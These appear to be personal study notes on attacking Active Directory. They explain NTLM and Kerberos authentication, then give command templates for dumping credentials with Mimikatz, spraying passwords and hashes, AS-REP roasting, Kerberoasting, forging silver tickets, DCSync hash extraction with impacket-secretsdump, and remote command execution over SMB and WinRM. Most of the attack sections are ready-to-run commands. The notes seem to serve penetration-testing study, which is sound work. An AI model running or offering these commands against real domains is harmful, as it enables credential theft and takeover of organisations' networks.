---
layout: blank
pagetitle: Attacking Active Directory
---

## Understanding Authentication

**NTLM**
- Used when authenticating via IP address (not hostname) or a hostname not present on the AD DNS server
- Steps are:
	- Calculate NTLM Hash
	- Send username to application server
	- App server sends nonce
	- Client encrypts nonce using their hash and sends both to app server
	- App server sends client response, username, and nonce to the DC (user's hash unknown)
	- DC encrypts nonce with NTLM hash (already known) of the user and compares to response
	- If valid, DC approves authentication

**Kerberos**
- Adopted from Kerberos v5 from MIT, used as primary auth method since 2003
- Uses a ticket system, DC acts as a Key Distribution Center (KDC)
- Rather than authenticating against the application, clients get a ticket from the KDC
- Steps:
	- Client sends Authentication Server Request (AS-REQ) to the DC
		- This contains a timestamp encrypted using the hash derived from the user's username and password
	- DC receives request and looks up the password hash of the user in the `ntds.dit` file, using it to decrypt the timestamp
	- If the decryption is successful and the timestamp is unique, auth is granted
	- DC then sends client an Authentication Server Reply (AS-REP), containing a session key and a ticket-granting ticket (TGT)
		- Session key can be decrypted with user hash and reused
		- TGT contains user and domain info, IP address of client, timestamp, and a session key
			- The TGT is encrypted using the NTLM hash of the krbtgt user
			- TGT is valid for 10 hours by default and is automatically renewed while session remains active
	- Client constructs a Ticket-Granting Service Request (TGS-REQ) consisting of the current user and timestamp encrypted with the session key, resource name, and encrypted TGT and sends that back to the DC/KDC
	- The DC then ensures the resource exists and decrypts the TGT with its secret key and extracts the session key for the username and timestamp of the request
	- The KDC then performs the following checks:
		- The TGT has a valid timestamp
		- The username from the TGS-REQ matches the username of the TGT
		- The client IP address coincides with the TGT IP address
	- If those checks pass, the KDC responds with a Ticket-Granting Server Reply (TGS-REP), containing three parts:
		- Name of the service access granted for
		- 2nd session key to be used between the client and service
		- Service ticket containing the username, group memberships, and 2nd session key
	- Now that the client has a session key and a service ticket, it sends the application an Application Request (AP-REQ) including the username/timestamp encrypted with the service ticket session key and the ticket itself
	- The application server decrypts the service ticket using its account password hash, extracting the username/session key, using the session key to decrypt the username from the AP-REQ. If they match, the service assigns the appropriate permissions to the user based on the group memberships in the ticket, and access is granted

**Cached Credentials**
- Password hashes stored in Local Security Authority Subsystem Service (LSASS)
- Basically just use Mimikatz as before
	- `privilege::debug` gives us the `SeDebugPrivilege` to run below commands
	- `token::elevate` to elevate to SYSTEM user
	- `lsadump::sam` will dump NTLM hashes of local users
	- `sekurlsa::logonpasswords` will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets
	- `sekurlsa::tickets` will show tickets stored in memory
		- We want to steal TGT more than a TGS for overall service access (rather than just one)
- Public Key Infrastructure (PKI)
	- Part of the Active Directory Certificate Service (AD CS), which implements PKI to exchange digital certs between authenticated users and trusted resources
	- Certificate Authority (CA) servers can grant/revoke certificates
		- The private keys used are usually non-exportable, but Mimikatz's `crypto::capi` and `crypto::cng` can take care of that

## AD Password Attacks

**Password Spraying**
- Avoiding lockout - `net accounts` will show authentication lockout information
- Using [script enumeration](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1) 
	- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`
- SMB password spraying
	- Use `crackmapexec`
		- `crackmapexec smb {IP_with_smb} -u users.txt -p passwords.txt -d {domain} --continue-on-success`
			- Can also pass single username/password
		- This sprays passwords against a single IP's SMB share
		- This will also show whether the user is an administrator
	- SMB hash spraying
		- `crackmapexec smb {IP} -u {users.txt} -H {hashes.txt}`
	- Crackmapexec can also run comands via SMB:
		- `nxc smb {IP} -u {username} -p {password} -X 'powershell -e ...`
- Obtaining TGTs
	- Use [kerbrute](https://github.com/ropnop/kerbrute/releases/) - `.\kerbrute_windows_amd64.exe passwordspray -d {domain} .\usernames.txt "{password}"`
	- AS-REP Roasting without credentials, described below
- WinRM
	- Indicated by port 5985/5986
	- `evil-winrm -i {IP} -u {domain_user} -p {password}`
	- Also accepts NTLM hashes `evil-winrm -i {IP} -u {user} -H {hash}`
- RPC:
	- Indicated by port 135,593
	- Can get an RPC shell with `rpcclient -U {username} {IP}`
		- `enumdomusers` can get the domain users from within RPC, which we can then check again for preauth
		- `queryuser {username}` to get user properties (passwords could be in descriptions)
			- Can also just `querydispinfo`
	- Could also have a null session (basically allowing anonymous users to connect and query info)
    	- `enum4linux` will check for this
    	- `rpcclient -U "" {IP} -N`

**AS-REP Roasting**
- Requires that Kerberos preauth is disabled, which prevents sending an AS-REQ on behalf of any user
- Performing hash cracking after receiving the AS-REP from the KDC
- Performed with `impacket-GetNPUsers` on kali side
	- `impacket-GetNPUsers -dc-ip {dc} -request -outputfile hashes.asreproast {domain}/{username}` (alongside password)
		- With users.txt: `impacket-GetNPUsers {domain}/ -no-pass -usersfile users.txt -dc-ip {IP} | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'`
	- Hashes can be cracked with Hashcat's 18200
- Performed with [`Rubeus`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) on Windows side
	- `.\Rubeus.exe asreproast /nowrap`
- This can also be done without a password to find users who don't have Kerberos pre-auth
	- `impacket-GetNPUsers -dc-ip {IP} {domain}/`
	- These users don't require a password to grab the TGT hash

**Kerberoasting**
- Cracking the password of the service account by using the encrypted SPN password hash used on the service ticket
- Can use `impacket-GetUserSPNs` if remote with creds
	- `impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {IP} -request`
- Can use `Rubeus` again if local
	- `.\Rubeus.exe kerberoast /outfile:hash.txt`
- Can crack with Hashcat's 13100 mode

**Silver Tickets**
- Forging our own service tickets via a password hash that should only be known to the DC and service account
	- Basically forging a ticket using a hash that tells the service we have more permissions than we actually do
	- This requires that Privileged Account Certificate (PAC) be disabled, which it often is
- To create the ticket, we need:
	- SPN password hash - can use `sekurlsa::logonpasswords` on machine with established session with application (usually(?) current machine)
	- Domain SID - `whoami /user` minus the last number (user RID)
	- Target SPN - basically just the DNS host name and the protocol (like HTTP)
- Performed using `mimikatz`
	- Don't escalate privileges to `NT Authority\System`
	- `kerberos::golden /sid:{sid} /domain:{domain} /ptt /target:{dnshostname} /service:{service_protocol(http)} /rc4:{NTLM_hash} /user:{any_domain_user}`
		- `ptt` allows us to inject forged ticket into memory of target machine
- Then, we should be able to access the service with the following:
	- `iwr -UseDefaultCredentials {protocol}://{dnshostname}`

**Domain Controller Synchronization**
- Sometimes multiple DCs across an environment for redundancy
- These DCs use Directory Replication Service (DRS) to synchronize
- DCs receiving requests for updates don't check if the request came from a known DC and only verify that the SID has the correct privileges
	- This means that we just need a user with the correct privileges
	- *Required*: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes in Filtered Set 
		- Owned by Domain Admins, Enterprise Admins, and Administrators by default
- If we have `WriteDACL` on the domain via a group, we can give ourselves the necessary permissions
- Performed with `mimikatz` on domain-joined machine or `impacket-secretsdump` on kali
	- This gives us a way to get the hash of any domain user
	- `lsadump::dcsync /user:{domain}\{user}` 
- Can also be performed with `impacket-secretsdump`
	- `impacket-secretsdump -just-dc-user {target_domain_user} {domain}/{admin_username}:"{password}"@{DC_IP}`
	- `impacket-secretsdump -hashes :{NTLM_hash} {domain}/{user}@{DC_IP}`
